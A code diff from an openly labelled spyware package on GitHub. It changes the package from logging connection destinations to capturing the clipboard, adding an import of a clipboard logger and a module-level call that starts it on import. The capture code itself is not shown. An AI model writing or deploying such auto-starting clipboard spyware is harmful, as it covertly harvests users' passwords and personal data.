@@ -1,8 +1,12 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 
+"""
+This package implements a SpyWare to capture the clipboard.
+"""
+
 ###################
-#    This file implements a SpyWare for connection destinations.
+#    This package implements a SpyWare to capture the clipboard.
 #    Copyright (C) 2021, 2022  Maurice Lambert
 
 #    This program is free software: you can redistribute it and/or modify
@@ -19,26 +23,13 @@
 #    along with this program.  If not, see <https://www.gnu.org/licenses/>.
 ###################
 
-"""
-This file implements a SpyWare for connection destinations.
-
-~# python3 DomainsLogger.py domainsSpy.conf
-
->>> from os import environ
->>> environ['domainsSpy.conf'] = 'domainsSpy.conf'
->>> from SpyWare.DomainsLogger import domainsSpy
->>> domainsSpy()                  # (using env) OR
->>> domainsSpy('domainsSpy.conf') # (using config file name) OR
->>> domainsSpy(argv=["DomainsLogger.py", "domainsSpy.conf"]) # (using argv)
-"""
-
 __version__ = "1.0.0"
 __author__ = "Maurice Lambert"
 __author_email__ = "mauricelambert434@gmail.com"
 __maintainer__ = "Maurice Lambert"
 __maintainer_email__ = "mauricelambert434@gmail.com"
 __description__ = """
-This file implements a complete spyware.
+This package implements a SpyWare to capture the clipboard.
 """
 license = "GPL-3.0 License"
 __url__ = "https://github.com/mauricelambert/SpyWare"
@@ -52,21 +43,10 @@ under certain conditions.
 __license__ = license
 __copyright__ = copyright
 
-__all__ = ["DomainsLogger", "domainsSpy", "domainsConfig"]
-
 try:
-    from .DomainsLogger import (
-        Daemon,
-        CacheAppData,
-        CacheDNS,
-        main as domainsSpy,
-        config_load as domainsConfig,
-    )
+    from .ClipboardLogger import main as clipboardSpy
 except ImportError:
-    from DomainsLogger import (
-        Daemon,
-        CacheAppData,
-        CacheDNS,
-        main as domainsSpy,
-        config_load as domainsConfig,
-    )
+    from ClipboardLogger import main as clipboardSpy
+
+print(copyright)
+clipboardSpy()
